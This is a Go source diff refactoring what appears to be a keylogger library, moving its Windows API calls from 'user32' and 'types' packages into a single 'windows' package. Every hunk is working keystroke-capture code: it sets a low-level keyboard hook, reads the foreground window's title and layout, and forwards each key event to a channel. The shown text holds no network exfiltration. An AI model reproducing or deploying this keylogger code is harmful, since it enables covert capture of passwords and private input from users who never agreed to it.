@@ -5,8 +5,7 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/Spriithy/gkl/client/types"
-	"github.com/Spriithy/gkl/client/user32"
+	"github.com/Spriithy/gkl/client/windows"
 )
 
 type KeyLogger struct {
@@ -23,19 +22,19 @@ func NewKeylogger(output chan string) *KeyLogger {
 }
 
 func (kl *KeyLogger) Start() {
-	user32.SetWindowsHookExW(types.WH_KEYBOARD_LL, kl.hook, types.NULL, 0)
-	var msg types.MSG
-	for user32.GetMessageW(&msg, 0, 0, 0) != 0 {
+	windows.SetWindowsHookExW(windows.WH_KEYBOARD_LL, kl.hook, 0, 0)
+	var msg windows.MSG
+	for windows.GetMessageW(&msg, 0, 0, 0) != 0 {
 	}
 }
 
-func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) types.LRESULT {
-	hWnd := user32.GetForegroundWindow()
-	threadId := user32.GetWindowThreadProcessId(hWnd, 0)
-	layout := user32.GetKeyboardLayout(threadId)
+func (kl *KeyLogger) hook(nCode int, wParam windows.WPARAM, lParam windows.LPARAM) windows.LRESULT {
+	hWnd := windows.GetForegroundWindow()
+	threadId := windows.GetWindowThreadProcessId(hWnd, 0)
+	layout := windows.GetKeyboardLayout(threadId)
 
 	var buf [256]uint16
-	user32.GetWindowTextW(hWnd, types.LPCWSTR(&buf[0]), 256)
+	windows.GetWindowTextW(hWnd, windows.LPCWSTR(&buf[0]), 256)
 	windowName := syscall.UTF16ToString(buf[:])
 
 	if windowName != kl.previousWindowName {
@@ -44,5 +43,5 @@ func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) t
 	}
 
 	kl.input <- newKeyboardEvent(wParam, lParam, layout)
-	return user32.CallNextHookEx(0, nCode, wParam, lParam)
+	return windows.CallNextHookEx(0, nCode, wParam, lParam)
 }
